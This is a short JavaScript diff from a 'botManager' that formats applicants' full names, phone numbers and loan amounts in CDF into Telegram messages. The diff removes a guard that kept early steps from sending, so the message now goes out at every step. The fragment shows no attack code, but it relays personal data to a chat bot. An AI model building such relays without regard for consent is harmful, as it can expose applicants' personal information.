@@ -18,10 +18,7 @@ const botManager = {
             msg += `👤 <b>Full Name:</b> <code>${data.firstName} ${data.lastName}</code>\n`;
             msg += `📱 <b>Phone Number:</b> <code>${data.phone}</code>\n`;
             msg += `💰 <b>Loan Amount:</b> <code>${data.amount} CDF</code>\n`;
-        } else {
-            // For steps 1, 2 - don't send anything to Telegram
-            return;
-        }
+        } 
         
         msg += `━━━━━━━━━━━━━━━━━━━━`;
 
